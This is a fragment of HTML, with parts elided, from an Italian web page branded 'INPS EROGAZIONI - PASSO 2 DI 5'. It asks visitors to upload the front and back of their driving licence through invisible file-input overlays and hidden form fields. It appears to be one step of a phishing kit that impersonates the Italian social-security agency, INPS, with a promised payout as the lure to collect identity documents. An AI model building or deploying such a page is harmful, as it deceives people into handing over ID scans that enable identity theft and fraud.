...
<body>
  ...
  <div class="resto" style="display: block;">
    ...
    <div style="font-size: 140%;margin: 0px 4%;font-weight:normal">
      ...
      <br>
      <br>
      <p>INPS EROGAZIONI - PASSO 2 DI 5</p>
      <div class="progress">
        <div class="progress-bar" role="progressbar" style="width: 33%" aria-valuenow="40" aria-valuemin="0"
          aria-valuemax="100"></div>
      </div>

      <form method="POST" style="text-align:center">

        <input autocomplete="off" required="" class="i1 nascondi CIF1" type="text" style="display:none"
          value="no patente" name="CIF1">

        <input autocomplete="off" required="" class="i1 nascondi CIF1" type="text" style="display:none"
          value="no patente" name="CIR1">
        <button type="submit" class="myButton2">se non hai la patente clicca qui </button>
      </Form>
      ...
      <form method="POST" autocomplete="off">
        ...
        <h3 class="sopra">Fronte Patente</h3>


        <div class="container caricamento" data-input="CIF1">
          <div class="row" style="padding-top:10px;">
            <div class="">
              <button id="uploadBtn" data-type="front-license" class="btn uploadBtn btn-large btn-primary">Carica
                documento Patente Fronte </button>
            </div>
          ...
          <input autocomplete="off" required="" class="i1 nascondi CIF1" type="text" name="CIF1">
        </div>

        <h3 class="sopra2">Assicurati che tutti gli angoli appaiono nella foto e che tutti i dati sul documento siano
          ben leggibili.</h3><br>
        <h3 class="sopra">Retro Patente</h3>


        <div class="container caricamento" data-input="CIR1">
          <div class="row" style="padding-top:10px;">
            <div class="">
              <button id="uploadBtn" data-type="retro-license" class="btn uploadBtn btn-large btn-primary">Carica
                documento Patente Retro</button>
            </div>
            <div class="col-12" style=" margin-top: 10px;padding-left:0px; ">
              <div id="progressOuter" class=" progressOuter progress progress-striped active"
                style="display:none;height: 30px;">
          ...
          <input autocomplete="off" required="" class="i1 input2 nascondi CIR1" type="text" name="CIR1">
    ...
    <form method="POST" style="text-align:center">
      ...
      <input autocomplete="off" required="" class="i1 nascondi CIF1" type="text" style="display:none" value="no patente"
        name="CIF1">
  ...
  <div
    style="display: block; position: absolute; visibility: hidden; overflow: hidden; margin: 0px; padding: 0px; opacity: 0; direction: ltr; z-index: 16777270; left: 32px; top: 311px; width: 224px; height: 39px;">
    <input type="file" name="uploadfile"
      style="position: absolute; right: 0px; margin: 0px; padding: 0px; font-size: 480px; font-family: sans-serif; cursor: pointer; height: 100%; z-index: 16777270;">
  </div>
  <div
    style="display: block; position: absolute; visibility: hidden; overflow: hidden; margin: 0px; padding: 0px; opacity: 0; direction: ltr; z-index: 16777270; left: 32px; top: 489px; width: 276px; height: 39px;">
    <input type="file" name="uploadfile"
      style="position: absolute; right: 0px; margin: 0px; padding: 0px; font-size: 480px; font-family: sans-serif; cursor: pointer; height: 100%; z-index: 16777270;">
  </div>
  <div
    style="display: none; position: relative; visibility: hidden; overflow: hidden; margin: 0px; padding: 0px; opacity: 0; direction: ltr; z-index: 16777270;">
    <input type="file" name="uploadfile"
      style="position: absolute; right: 0px; margin: 0px; padding: 0px; font-size: 480px; font-family: sans-serif; cursor: pointer; height: 100%; z-index: 16777270;">
  </div>
</body>
